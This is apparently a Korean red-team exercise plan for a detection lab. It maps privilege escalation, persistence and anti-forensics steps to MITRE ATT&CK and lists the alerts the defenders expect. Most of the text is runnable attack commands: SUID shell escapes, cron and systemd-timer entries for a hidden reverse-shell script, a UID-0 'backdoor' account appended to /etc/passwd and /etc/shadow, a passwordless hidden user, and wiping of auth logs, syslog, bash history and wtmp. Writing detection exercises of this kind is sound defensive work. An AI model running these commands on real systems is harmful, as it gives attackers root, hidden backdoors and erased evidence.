# Red Team Tier 3: 권한 상승 + 지속성 확보

## MITRE ATT&CK 매핑

```
T1548.001 Setuid/Setgid → T1068 Exploitation for Privilege Escalation
→ T1053.003 Scheduled Task/Cron → T1136.001 Create Local Account
→ T1070.004 File Deletion (Anti-Forensics)
```

## 전제 조건

- web 서버에서 일반 사용자(www-data) 쉘 확보 (Tier 1 성공)
- 목표: root 권한 획득 → 지속적 접근 확보 → 흔적 제거

---

## 공격 단계

### Stage 1: SUID 바이너리 탐색 + 악용 (T1548.001)

```bash
# SUID 비트 설정된 바이너리 탐색
find / -perm -4000 -type f 2>/dev/null

# GTFOBins 패턴 검색 (알려진 SUID 악용 가능 바이너리)
for bin in find vim python3 perl nmap less more awk env cp; do
  which $bin 2>/dev/null && ls -la $(which $bin) | grep "^-..s"
done

# python3에 SUID가 있다면:
# python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# find에 SUID가 있다면:
# find / -name "nothing" -exec /bin/bash -p \;
```

### Stage 2: Kernel Exploit PoC 탐색 (T1068)

```bash
# 커널 버전 확인
uname -r
cat /proc/version

# 알려진 취약점 매칭
# CVE 기반 exploit 존재 여부 확인 (실행은 하지 않음, PoC 식별만)
# DirtyPipe (CVE-2022-0847): kernel 5.8~5.16.11
# GameOver(lay) (CVE-2023-2640): Ubuntu OverlayFS

KVER=$(uname -r)
echo "Kernel: $KVER"
# 취약 커널 범위 체크 (스크립트로)
python3 -c "
import re
ver = '$(uname -r)'
major = ver.split('.')[0:2]
print(f'Kernel version: {ver}')
# CVE-2022-0847 DirtyPipe: 5.8 <= ver <= 5.16.11
# CVE-2023-2640 GameOver(lay): Ubuntu 특정 버전
print('Checking known CVEs...')
"
```

### Stage 3: 지속성 — Cron Job 등록 (T1053.003)

```bash
# 숨겨진 리버스 쉘 cron 등록 시뮬레이션
# (실제 외부 연결은 하지 않음)

# 방법 1: 사용자 crontab
echo "*/5 * * * * /tmp/.hidden_shell.sh" | crontab -

# 방법 2: /etc/cron.d/ 직접 파일
echo "*/10 * * * * root /tmp/.persist.sh" > /etc/cron.d/.hidden_job 2>/dev/null

# 방법 3: systemd timer (더 은밀)
cat > /tmp/.hidden.timer << 'EOF'
[Unit]
Description=System Health Check

[Timer]
OnCalendar=*:0/15
Persistent=true

[Install]
WantedBy=timers.target
EOF
# → AuditD/Sysmon이 crontab 변경 + 파일 생성 감지해야 함
```

### Stage 4: 숨겨진 사용자 계정 생성 (T1136.001)

```bash
# UID 0 (root 권한) 계정 생성 시도
echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd 2>/dev/null
echo 'backdoor:$6$salt$hash:19000:0:99999:7:::' >> /etc/shadow 2>/dev/null

# 또는 일반 사용자로 숨기기 (UID 65534 근처)
useradd -u 65533 -o -g root -M -s /bin/bash -p '' syscheck 2>/dev/null

# → AuditD /etc/passwd 감시 + Wazuh 계정 변경 탐지
```

### Stage 5: 흔적 제거 (T1070.004)

```bash
# 로그 파일 조작
echo "" > /var/log/auth.log 2>/dev/null
echo "" > /var/log/syslog 2>/dev/null

# bash history 제거
history -c
echo "" > ~/.bash_history
unset HISTFILE

# 최근 로그인 기록 삭제 시도
utmpdump /var/log/wtmp 2>/dev/null | grep -v "backdoor" > /tmp/clean_wtmp
# → Wazuh 파일 무결성 모니터링(FIM)이 로그 삭제 탐지
```

---

## 탐지 기대점

| 공격 | 탐지 소스 | 기대 경보 | SIGMA 룰 가능 |
|------|---------|---------|--------------|
| SUID 탐색 (find -perm) | AuditD→Wazuh | 대량 파일 접근 패턴 | ✅ |
| Cron 등록 | Sysmon/AuditD→Wazuh | crontab 변경 이벤트 | ✅ |
| /etc/passwd 수정 | Wazuh FIM | 파일 무결성 위반 | ✅ |
| 계정 생성 | AuditD→Wazuh | useradd/passwd 변경 | ✅ |
| 로그 삭제 | Wazuh FIM | 로그 파일 크기 급감/삭제 | ✅ |
| history 조작 | Sysmon→Wazuh | .bash_history 수정 | ✅ |

---

## 학술적 수준 근거

- **MITRE ATT&CK Persistence + Privilege Escalation** 기법 직접 시연
- **SUID/Kernel exploit** 탐색은 실제 Red Team 평가에서 핵심 단계
- **Anti-forensics** (로그 삭제, history 조작)은 APT 수준 기법
- 참고: *"Persistence Mechanisms in Linux"* (USENIX Security), *"Host-based Intrusion Detection using Audit Logs"* (ACM CCS)
